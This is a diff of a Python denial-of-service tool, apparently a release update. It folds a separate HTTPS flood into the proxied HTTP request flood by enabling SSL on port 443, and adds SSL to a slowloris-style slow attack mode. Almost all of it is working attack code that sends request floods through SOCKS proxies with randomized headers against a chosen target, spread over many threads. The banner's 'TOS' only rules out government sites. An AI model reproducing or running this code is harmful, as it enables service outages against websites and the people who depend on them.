@@ -17,10 +17,10 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 1.6.2(Fix error code)
+Python3 version 1.6.3(ReCode CC and Slow mode)
                             C0d3d by Lee0n123
 ===============================================
-         --> Added Slow attack mode <--
+       --> Use 443 Port Auto Enable SSL <--
                       TOS:
          Don't Attack Government Website.
 ===============================================''')
@@ -186,8 +186,13 @@ def cc():
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			s = socks.socksocket()
 			s.connect((str(ip), int(port)))
+			if str(port) == '443':
+				s = ssl.wrap_socket(s)
+				n = "HTTPS"
+			else:
+				n = "CC"
 			s.send(str.encode(request))
-			print ("[*] CC Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] "+n+" Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for y in range(multiple):
 					s.send(str.encode(request))
@@ -198,8 +203,13 @@ def cc():
 			try:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 				s.connect((str(ip), int(port)))
+				if str(port) == '443':
+					s = ssl.wrap_socket(s)
+					n = "HTTPS"
+				else:
+					n = "CC"
 				s.send(str.encode(request))
-				print ("[*] CC Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+				print ("[*] "+n+" Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
 				try:
 					for y in range(multiple):
 						s.send(str.encode(request))
@@ -209,45 +219,6 @@ def cc():
 				print ("[!] Connection Error")
 				s.close()
 
-def sslflood():
-	get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-	referer = "Referer: https://www.google.com/?search="+ ip + url2 + "\r\n"
-	connection = "Connection: Keep-Alive\r\n"
-	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-	accept = random.choice(acceptall)
-	request = get_host + referer + useragent + accept + connection + "\r\n"
-	proxy = random.choice(proxies).strip().split(":")
-	while True:
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-				s = socks.socksocket()
-				s.connect((str(ip), int(port)))
-				ss = ssl.wrap_socket(s)
-				ss.send(str.encode(request))
-				print ("[*] HTTPS Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
-				try:
-					for y in range(multiple):
-						ss.send(str.encode(request))
-				except:
-					s.close()
-			except:
-				s.close()
-				try:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-					s = socks.socksocket()
-					s.connect((str(ip), int(port)))
-					ss = ssl.wrap_socket(s)
-					ss.send(str.encode(request))
-					print ("[*] HTTPS Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
-					try:
-						for y in range(multiple):
-							ss.send(str.encode(request))
-					except:
-						s.close()
-				except:
-					print ("[!] Connection Error")
-					s.close()
-
 def slow():
 	time.sleep(1)
 	proxy = random.choice(proxies).strip().split(":")
@@ -255,6 +226,10 @@ def slow():
 		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 		s = socks.socksocket()
 		s.connect((str(ip), int(port)))
+		if str(port) == '443':
+			s = ssl.wrap_socket(s)
+		else:
+			pass
 		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
 		s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
 		s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
@@ -280,10 +255,6 @@ def main():
 	if mode == "slow":
 		pass
 	else:
-		https = str(input("> Https(y/n):"))
-	if mode == "slow":
-		pass
-	else:
 		url = str(input("> Page you want to attack(default=/):"))
 	port = str(input("> Port(Https default is 443):"))
 	if port == '':
@@ -291,6 +262,8 @@ def main():
 		print("> Default choose port 80\r\n> Port 80 was chosen")
 	else:
 		port = int(port)
+		if str(port) == '443':
+			print(" [!] Enable SSL Mode")
 	thread_num = int(input("> Threads:"))
 	N = str(input("> Do you need to get socks5 list?(y/n):"))
 	if N == 'y':
@@ -323,16 +296,11 @@ def main():
 		for i in range(thread_num):
 			th = threading.Thread(target = slow)
 			th.start()
-			time.sleep(0.1)
+			time.sleep(0.08)
 	elif mode == "cc":
-		if https == "y":
-			for i in range(thread_num):
-				th = threading.Thread(target = sslflood)
-				th.start()
-		else:				
-			for i in range(thread_num):
-				th = threading.Thread(target = cc)
-				th.start()
+		for i in range(thread_num):
+			th = threading.Thread(target = cc)
+			th.start()
 	else:
 		print("[!] Input Error")
 		sys.exit()
